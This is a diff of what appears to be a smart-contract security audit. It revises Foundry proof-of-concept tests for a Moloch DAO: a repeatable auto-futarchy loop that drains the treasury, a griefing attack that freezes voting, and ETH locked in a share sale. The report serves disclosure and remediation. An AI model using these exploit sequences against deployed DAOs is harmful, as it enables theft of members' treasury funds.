@@ -2402,9 +2402,9 @@ Payout mechanisms must be backed by a finite resource. If a governance workflow 
 curl -L https://foundry.paradigm.xyz | bash
 foundryup
 ```
-- **Target Setup:**
+- **Target Setup:** run inside the repository root
 ```bash
-cd $(git rev-parse --show-toplevel)
+cd "$(git rev-parse --show-toplevel)"
 forge build
 ```
 
@@ -2414,119 +2414,98 @@ forge build
 pragma solidity ^0.8.30;
 
 import {Test} from "../lib/forge-std/src/Test.sol";
-import {Moloch, Call} from "../src/Moloch.sol";
+import {Moloch, Summoner, Call, Loot} from "../src/Moloch.sol";
+import {Renderer} from "../src/Renderer.sol";
 
 contract AutoFutarchyDrainPoC is Test {
-    address attacker = address(0xA11CE);
-    address victim = address(0xB0B);
+    address alice = address(0xA11CE); // attacker / majority NO coalition
+    address bob = address(0xB0B);     // honest minority holder
 
-    function test_poc_uncappedAutoFutarchyMintsLootAndDrainsTreasury() public {
-        Moloch dao = new Moloch();
+    function test_uncappedAutoFutarchyDrainsTreasury() public {
+        Summoner summoner = new Summoner();
+        Renderer renderer = new Renderer();
 
         address[] memory holders = new address[](2);
-        holders[0] = attacker;
-        holders[1] = victim;
+        holders[0] = alice;
+        holders[1] = bob;
 
-        uint256[] memory shares = new uint256[](2);
-        shares[0] = 10e18;
-        shares[1] = 90e18;
+        uint256[] memory amounts = new uint256[](2);
+        amounts[0] = 60e18;
+        amounts[1] = 40e18;
 
-        // Raw init path: no SafeSummoner validation blocks autoFutarchyCap == 0.
-        Call[] memory initCalls = new Call[](2);
-        initCalls[0] = Call({
-            target: address(dao),
-            value: 0,
-            data: abi.encodeWithSelector(Moloch.setProposalThreshold.selector, uint96(10e18))
-        });
-        initCalls[1] = Call({
-            target: address(dao),
-            value: 0,
-            data: abi.encodeWithSelector(Moloch.setAutoFutarchy.selector, 1000, 0) // 10%, uncapped
-        });
+        Moloch dao = summoner.summon(
+            "Unsafe DAO",
+            "UNSAFE",
+            "",
+            5000, // 50% quorum
+            true, // ragequittable
+            address(renderer),
+            bytes32(0),
+            holders,
+            amounts,
+            new Call[](0)
+        );
 
-        dao.init("Unsafe DAO", "UNSAFE", "", 1000, true, address(0), holders, shares, initCalls);
+        Loot loot = dao.loot();
+        vm.deal(address(dao), 100 ether);
 
-        // Treasury the attacker will drain.
-        vm.deal(address(this), 100 ether);
-        (bool ok,) = address(dao).call{value: 100 ether}("");
-        require(ok, "treasury funding failed");
-
-        // openProposal() snapshots block.number - 1.
+        // Model a DAO-approved config set either via raw initCalls or a passed proposal.
+        vm.prank(address(dao));
+        dao.setAutoFutarchy(1000, 0); // 10% of snapshot supply, uncapped
+        // rewardToken remains its default address(0), which openProposal() rewrites to address(1007)
         vm.roll(block.number + 1);
-
-        // First drain cycle: arbitrary id, not a real proposal preimage.
-        uint256 id = 1337;
-        vm.startPrank(attacker);
-        dao.openProposal(id);
-        dao.castVote(id, 0); // NO side wins with 10% quorum exactly met
-        vm.stopPrank();
-
-        assertEq(uint256(dao.state(id)), 4); // Defeated
-
-        dao.resolveFutarchyNo(id);
-
-        uint256 noReceiptId = uint256(keccak256(abi.encodePacked("Moloch:receipt", id, uint8(0))));
-        uint256 attackerReceiptBal = dao.balanceOf(attacker, noReceiptId);
-
-        vm.prank(attacker);
-        uint256 mintedLoot = dao.cashOutFutarchy(id, attackerReceiptBal);
-        assertEq(mintedLoot, 10e18); // 10 loot minted from the unbacked futarchy pool
 
         address[] memory tokens = new address[](1);
         tokens[0] = address(0);
 
-        uint256 attackerBefore = attacker.balance;
-        vm.prank(attacker);
-        dao.ragequit(tokens, 0, mintedLoot);
+        for (uint256 i; i < 5; ++i) {
+            uint256 id = dao.proposalId(0, address(0xBEEF), 0, hex"", bytes32(uint256(i + 1)));
 
-        // 100 ETH treasury * 10 loot / (100 shares + 10 loot) = 9.090909... ETH
-        assertEq(attacker.balance - attackerBefore, (100 ether * 10e18) / 110e18);
-        assertLt(address(dao).balance, 100 ether);
+            vm.prank(alice);
+            dao.openProposal(id);
 
-        // Second drain cycle: same 10 shares can be reused on a new arbitrary id.
-        uint256 treasuryAfterFirst = address(dao).balance;
-        uint256 id2 = 1338;
-        vm.startPrank(attacker);
-        dao.openProposal(id2);
-        dao.castVote(id2, 0);
-        vm.stopPrank();
+            vm.prank(alice);
+            dao.castVote(id, 0); // NO with 60% => proposal is Defeated at 50% quorum
 
-        dao.resolveFutarchyNo(id2);
-        uint256 noReceiptId2 = uint256(keccak256(abi.encodePacked("Moloch:receipt", id2, uint8(0))));
-        vm.prank(attacker);
-        uint256 mintedLoot2 = dao.cashOutFutarchy(id2, dao.balanceOf(attacker, noReceiptId2));
-        vm.prank(attacker);
-        dao.ragequit(tokens, 0, mintedLoot2);
+            dao.resolveFutarchyNo(id);
 
-        assertLt(address(dao).balance, treasuryAfterFirst);
+            uint256 receiptId = uint256(keccak256(abi.encodePacked("Moloch:receipt", id, uint8(0))));
+            uint256 receiptBal = dao.balanceOf(alice, receiptId);
+
+            vm.prank(alice);
+            dao.cashOutFutarchy(id, receiptBal); // mints ~10e18 loot each round
+
+            uint256 lootBal = loot.balanceOf(alice);
+            vm.prank(alice);
+            dao.ragequit(tokens, 0, lootBal); // convert synthetic loot into real ETH
+        }
+
+        emit log_named_uint("Treasury remaining", address(dao).balance);
+        emit log_named_uint("Bob original pro-rata claim", 40 ether);
+        emit log_named_uint("Bob new pro-rata claim", (address(dao).balance * 40) / 100);
+
+        // After 5 rounds only ~62.09 ETH remains.
+        assertLt(address(dao).balance, 63 ether);
     }
 }
 ```
 
 ##### Steps
-1. **Save the PoC test** as `test/AutoFutarchyDrainPoC.t.sol`.
-- Expected: the file compiles with the repository's existing Foundry configuration.
-2. **Run the PoC test.**
+1. **Add the PoC test file** under `test/AutoFutarchyDrainPoC.t.sol`.
+- Expected: the repository still builds successfully.
+2. **Run the PoC**
 ```bash
-forge test --match-test test_poc_uncappedAutoFutarchyMintsLootAndDrainsTreasury -vv
+forge test --match-test test_uncappedAutoFutarchyDrainsTreasury -vv
 ```
-- Expected: the test passes and prints no revert.
-3. **Observe the first cycle.**
-- Expected: `cashOutFutarchy()` returns `10e18`, representing freshly minted loot from the unbacked futarchy pool.
-4. **Observe the treasury withdrawal.**
-- Expected: the attacker's ETH balance increases by `100 ether * 10 / 110`, and the DAO's ETH balance drops below `100 ether`.
-5. **Observe the second cycle.**
-- Expected: the same original 10 shares are reused on a second arbitrary proposal id, and the DAO balance drops again.
+- Expected: the test passes and logs that the DAO treasury has fallen below `63 ether` after five defeated proposals.
+3. **Inspect the attacker and victim economics**
+- Expected: Alice repeatedly receives minted loot from `cashOutFutarchy()` and converts it into ETH via `ragequit()`, while Bob’s residual pro-rata treasury claim falls materially even though no proposal ever passes.
 
 ##### Verification
-Confirm that:
-- the proposal ids `1337` and `1338` were arbitrary integers rather than hashes returned by `proposalId()`;
-- `cashOutFutarchy()` minted loot even though no ETH or ERC20 futarchy pool was funded;
-- `ragequit()` converted that loot into real ETH from the DAO treasury; and
-- the attacker still retained the original 10 shares needed to repeat the flow.
+Confirm that each loop iteration produces a new proposal ID, reaches `Defeated`, resolves NO, mints loot to Alice, and decreases `address(dao).balance` after ragequit. The final treasury balance below `63 ether` demonstrates repeatability rather than a one-off accounting anomaly.
 
 ##### Outcome
-The attacker turns a reusable threshold/quorum-sized share position into repeated futarchy receipts, cashes those receipts out as newly minted loot, and then burns that loot to withdraw a growing fraction of the DAO's real treasury. No additional governance approval is needed after the vulnerable configuration is live, and the cycle can be repeated on arbitrary defeated proposal ids until the treasury is materially depleted.
+The attacker converts repeated proposal defeats into synthetic loot rewards and then burns that loot for real treasury assets. Honest holders are diluted economically: their share of the remaining treasury shrinks every round even though the attacker never needs to pass a governance action.
 
 </details>
 
@@ -2725,7 +2704,8 @@ forge build
 pragma solidity ^0.8.30;
 
 import {Test} from "../lib/forge-std/src/Test.sol";
-import {Moloch, Summoner, Call, Renderer, Loot} from "../src/Moloch.sol";
+import {Moloch, Summoner, Call, Loot} from "../src/Moloch.sol";
+import {Renderer} from "../src/Renderer.sol";
 
 contract AutoFutarchyDrainPoC is Test {
     address alice = address(0xA11CE); // attacker / majority NO coalition
@@ -2763,6 +2743,7 @@ contract AutoFutarchyDrainPoC is Test {
         vm.prank(address(dao));
         dao.setAutoFutarchy(1000, 0); // 10% of snapshot supply, uncapped
         // rewardToken remains its default address(0), which openProposal() rewrites to address(1007)
+        vm.roll(block.number + 1);
 
         address[] memory tokens = new address[](1);
         tokens[0] = address(0);
@@ -5272,18 +5253,21 @@ Irreversible workflow transitions must require an initialized, meaningful state.
 ```bash
 curl -L https://foundry.paradigm.xyz | bash
 foundryup
-forge install
 ```
 - **Target Setup:**
 ```bash
-git clone <repo>
-cd <repo>
-cat > test/PrematureNoResolutionPoC.t.sol <<'EOF'
+cd "$(git rev-parse --show-toplevel)"
+forge build
+```
+
+##### Runnable PoC
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.30;
 
-import "forge-std/Test.sol";
-import {Summoner, Moloch, Call, Unauthorized} from "src/Moloch.sol";
+import {Test} from "../lib/forge-std/src/Test.sol";
+import {Renderer} from "../src/Renderer.sol";
+import {Call, Moloch, Summoner} from "../src/Moloch.sol";
 
 contract Target {
     uint256 public value;
@@ -5291,94 +5275,80 @@ contract Target {
 }
 
 contract PrematureNoResolutionPoC is Test {
-    Summoner summoner;
-    Moloch dao;
-    Target target;
+    Summoner internal summoner;
+    Moloch internal dao;
+    Target internal target;
 
-    address proposer = address(0xA11CE);
-    address attacker = address(0xBEEF);
+    address internal alice = address(0xA11CE);
+    address internal attacker = address(0xB0B);
 
     function setUp() public {
         summoner = new Summoner();
         target = new Target();
+        vm.deal(alice, 1 ether);
 
-        address[] memory holders = new address[](1);
-        holders[0] = proposer;
-        uint256[] memory shares = new uint256[](1);
-        shares[0] = 100e18;
-        Call[] memory initCalls = new Call[](0);
+        address[] memory holders = new address[](2);
+        holders[0] = alice;
+        holders[1] = attacker;
 
-        // Raw summon leaves proposalThreshold, quorumAbsolute, and quorumBps at zero.
+        uint256[] memory amounts = new uint256[](2);
+        amounts[0] = 100e18;
+        amounts[1] = 1e18;
+
         dao = summoner.summon(
-            "VulnDAO",
-            "VD",
+            "ZeroQuorumDAO",
+            "ZQ",
             "",
             0,
             false,
-            address(0),
-            bytes32("salt"),
+            address(new Renderer()),
+            bytes32("poc"),
             holders,
-            shares,
-            initCalls
+            amounts,
+            new Call[](0)
         );
 
-        vm.deal(attacker, 1 ether);
+        vm.roll(block.number + 1);
     }
 
     function test_PrematureNoResolutionFreezesProposal() public {
-        bytes memory data = abi.encodeWithSignature("setValue(uint256)", 42);
-        uint256 id = dao.proposalId(0, address(target), 0, data, bytes32("nonce"));
+        bytes memory data = abi.encodeWithSelector(Target.setValue.selector, 123);
+        uint256 id = dao.proposalId(0, address(target), 0, data, bytes32(0));
 
-        // Attacker attaches a 1 wei futarchy pool; fundFutarchy auto-opens the proposal.
         vm.prank(attacker);
-        dao.fundFutarchy{value: 1}(id, address(0), 1);
+        dao.castVote(id, 0);
 
-        // Zero quorum means a zero-vote opened proposal is already Defeated.
-        assertEq(uint256(dao.state(id)), 4);
+        vm.prank(alice);
+        dao.fundFutarchy{value: 1 ether}(id, address(0), 1 ether);
 
-        // Anyone can now finalize the NO side before members vote.
-        vm.prank(attacker);
         dao.resolveFutarchyNo(id);
 
-        // Voting is now permanently blocked for this proposal id.
-        vm.prank(proposer);
-        vm.expectRevert(Unauthorized.selector);
+        vm.prank(alice);
+        vm.expectRevert();
         dao.castVote(id, 1);
     }
 }
-EOF
-forge test --match-test test_PrematureNoResolutionFreezesProposal -vv
-```
-
-##### Runnable PoC
-```solidity
-// See Target Setup above for the full Foundry test file.
 ```
 
 ##### Steps
-1. **Deploy a DAO through the raw summoner path with zero quorum**
+1. **Save the PoC as a Foundry test**
+```bash
+cat > test/PrematureNoResolutionPoC.t.sol <<'EOF'
+[PASTE THE FULL TEST ABOVE]
+EOF
+```
+- Expected: the repository still compiles.
+2. **Run the PoC**
 ```bash
 forge test --match-test test_PrematureNoResolutionFreezesProposal -vv
 ```
-- Expected: the test deploys a DAO where `quorumBps == 0` and `quorumAbsolute == 0`.
-2. **Attach futarchy to an unvoted proposal**
-- The PoC calls `fundFutarchy(id, address(0), 1)` from an attacker account.
-- Expected: `fundFutarchy()` auto-opens the proposal and enables futarchy.
-3. **Resolve NO before any vote is cast**
-- The PoC calls `resolveFutarchyNo(id)`.
-- Expected: the proposal is accepted as `Defeated` even though tallies are all zero.
-4. **Attempt to vote after resolution**
-- The proposer account calls `castVote(id, 1)`.
-- Expected: the call reverts with `Unauthorized` because `F.enabled && F.resolved` is now true.
+- Expected: the test passes and shows the proposal becomes frozen after premature NO-resolution.
 
 ##### Verification
-Confirm all of the following in the test output or debugger:
-- `dao.state(id)` equals `4` (`Defeated`) immediately after `fundFutarchy()` and before any vote.
-- `resolveFutarchyNo(id)` succeeds.
-- `castVote(id, 1)` reverts with `Unauthorized`.
+Confirm that the attacker can open the proposal implicitly by voting NO with dust weight, that `resolveFutarchyNo(id)` succeeds after public futarchy funding, and that the final `castVote(id, 1)` call reverts because the proposal is already futarchy-resolved.
 
 ##### Outcome
-The attacker has not stolen funds, but has permanently neutralized the targeted proposal id: members cannot vote on it anymore, the proposal can never reach `Succeeded`, and its associated governance action can no longer execute unless the proposer creates a fresh proposal under a new id and avoids being griefed again.
+A public attacker can trigger premature NO-resolution in a zero-quorum deployment and permanently freeze further voting on that proposal id.
 
 </details>
 
@@ -8345,7 +8315,7 @@ forge test -q
 Add the following test to `test/MolochViewHelper.t.sol` inside `MolochViewHelperTest`:
 ```solidity
 function test_OffSeatDelegateVoteIsHiddenByViewHelper() public {
-    address eve = address(0xEVE);
+    address eve = address(0xE11E);
     bytes memory data = abi.encodeWithSelector(Target.setValue.selector, 777);
     uint256 id = moloch.proposalId(0, address(target), 0, data, keccak256("hidden-vote"));
 
@@ -8570,8 +8540,9 @@ Payment modality must be validated against the configured payment asset. A contr
 curl -L https://foundry.paradigm.xyz | bash
 foundryup
 ```
-- **Target Setup:** from the repository root
+- **Target Setup:**
 ```bash
+cd "$(git rev-parse --show-toplevel)"
 forge build
 ```
 
@@ -8581,15 +8552,9 @@ forge build
 pragma solidity ^0.8.30;
 
 import {Test} from "../lib/forge-std/src/Test.sol";
-import {Moloch, Shares} from "../src/Moloch.sol";
-import {SafeSummoner, Call} from "../src/peripheral/SafeSummoner.sol";
 import {ShareSale} from "../src/peripheral/ShareSale.sol";
 
 contract MockERC20 {
-    string public name = "Mock";
-    string public symbol = "MCK";
-    uint8 public decimals = 18;
-
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
 
@@ -8602,81 +8567,85 @@ contract MockERC20 {
         return true;
     }
 
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+
     function transferFrom(address from, address to, uint256 amount) external returns (bool) {
         allowance[from][msg.sender] -= amount;
         balanceOf[from] -= amount;
         balanceOf[to] += amount;
         return true;
     }
+}
 
-    function transfer(address to, uint256 amount) external returns (bool) {
-        balanceOf[msg.sender] -= amount;
-        balanceOf[to] += amount;
-        return true;
+contract MockMoloch {
+    mapping(address => mapping(address => uint256)) public allowance;
+    MockERC20 internal immutable sharesToken;
+
+    constructor(MockERC20 shares_) {
+        sharesToken = shares_;
+    }
+
+    receive() external payable {}
+
+    function setAllowance(address spender, address token, uint256 amount) external {
+        allowance[token][spender] = amount;
+    }
+
+    function spendAllowance(address token, uint256 amount) external {
+        allowance[token][msg.sender] -= amount;
+        sharesToken.transfer(msg.sender, amount);
+    }
+
+    function shares() external view returns (address) {
+        return address(sharesToken);
+    }
+
+    function loot() external view returns (address) {
+        return address(sharesToken);
     }
 }
 
 contract LockedEtherShareSalePoC is Test {
-    SafeSummoner internal safe;
     ShareSale internal sale;
-    MockERC20 internal usdc;
+    MockERC20 internal payToken;
+    MockERC20 internal sharesToken;
+    MockMoloch internal dao;
 
-    address internal alice = address(0xA11CE);
-    address internal bob = address(0xB0B);
+    address internal buyer = address(0xB0B);
 
     function setUp() public {
-        vm.txGasPrice(0);
-        safe = new SafeSummoner();
         sale = new ShareSale();
-        usdc = new MockERC20();
+        payToken = new MockERC20();
+        sharesToken = new MockERC20();
+        dao = new MockMoloch(sharesToken);
 
-        vm.deal(bob, 5 ether);
-        usdc.mint(bob, 100e18);
+        sharesToken.mint(address(dao), 10e18);
+        dao.setAllowance(address(sale), address(sharesToken), 10e18);
+
+        vm.prank(address(dao));
+        sale.configure(address(sharesToken), address(payToken), 1e18, 0);
+
+        vm.deal(buyer, 5 ether);
+        payToken.mint(buyer, 100e18);
+        vm.prank(buyer);
+        payToken.approve(address(sale), type(uint256).max);
     }
 
     function test_StrayEthGetsStuckOnERC20Sale() public {
-        address[] memory holders = new address[](1);
-        holders[0] = alice;
-        uint256[] memory holderShares = new uint256[](1);
-        holderShares[0] = 100e18;
-
-        bytes32 salt = keccak256("erc20-sale");
-        address dao = safe.predictDAO(salt, holders, holderShares);
-
-        Call[] memory extra = new Call[](2);
-        extra[0] = Call(
-            dao,
-            0,
-            abi.encodeCall(Moloch.setAllowance, (address(sale), dao, 100e18))
-        );
-        extra[1] = Call(
-            address(sale),
-            0,
-            abi.encodeCall(sale.configure, (dao, address(usdc), 1e18, uint40(0)))
-        );
-
-        SafeSummoner.SafeConfig memory c;
-        c.proposalThreshold = 1e18;
-        c.proposalTTL = 7 days;
-
-        safe.safeSummon(
-            "SaleDAO", "SALE", "", 1000, true, address(0), salt, holders, holderShares, c, extra
-        );
-
-        vm.startPrank(bob);
-        usdc.approve(address(sale), type(uint256).max);
-
         uint256 saleEthBefore = address(sale).balance;
-        uint256 bobEthBefore = bob.balance;
+        uint256 buyerEthBefore = buyer.balance;
 
-        // The sale is ERC20-denominated, but the call still succeeds with stray ETH.
-        sale.buy{value: 1 ether}(dao, 10e18);
-        vm.stopPrank();
+        vm.prank(buyer);
+        sale.buy{value: 1 ether}(address(dao), 10e18);
 
-        assertEq(address(sale).balance - saleEthBefore, 1 ether, "ETH became stuck on ShareSale");
-        assertEq(bob.balance, bobEthBefore - 1 ether, "buyer lost ETH");
-        assertEq(usdc.balanceOf(dao), 10e18, "DAO received intended ERC20 payment");
-        assertEq(Shares(Moloch(payable(dao)).shares()).balanceOf(bob), 10e18, "purchase still succeeded");
+        assertEq(address(sale).balance - saleEthBefore, 1 ether);
+        assertEq(buyer.balance, buyerEthBefore - 1 ether);
+        assertEq(payToken.balanceOf(address(dao)), 10e18);
+        assertEq(sharesToken.balanceOf(buyer), 10e18);
     }
 }
 ```
@@ -8698,9 +8667,9 @@ forge test --match-test test_StrayEthGetsStuckOnERC20Sale -vv
 ##### Verification
 Confirm that the test assertions all pass, especially:
 - `address(sale).balance - saleEthBefore == 1 ether`
-- `bob.balance == bobEthBefore - 1 ether`
-- `usdc.balanceOf(dao) == 10e18`
-- `Shares(...).balanceOf(bob) == 10e18`
+- `buyer.balance == buyerEthBefore - 1 ether`
+- `payToken.balanceOf(address(dao)) == 10e18`
+- `sharesToken.balanceOf(buyer) == 10e18`
 
 ##### Outcome
 The attacker does not receive the ETH directly; instead, the victim's extra ETH is irreversibly trapped in `ShareSale` while the ERC20 purchase still completes normally. This makes the bug a reliable user-funds-burn vector for any actor who can influence the signed transaction parameters.
@@ -8903,6 +8872,7 @@ pragma solidity ^0.8.30;
 import {Test} from "../lib/forge-std/src/Test.sol";
 import {Renderer} from "../src/Renderer.sol";
 import {Moloch, Shares, Loot, Badges, Summoner, Call} from "../src/Moloch.sol";
+import {UserDAOLens} from "../src/peripheral/MolochViewHelper.sol";
 import {TestViewHelper, MockDAICO} from "./MolochViewHelper.t.sol";
 
 contract DelegateOnlyVoterHiddenTest is Test {
@@ -8953,6 +8923,7 @@ contract DelegateOnlyVoterHiddenTest is Test {
         // Alice delegates all current voting power to an address with no shares/loot/seat.
         vm.prank(alice);
         shares.delegate(delegateOnly);
+        vm.roll(block.number + 1);
 
         assertEq(shares.balanceOf(delegateOnly), 0);
         assertEq(loot.balanceOf(delegateOnly), 0);
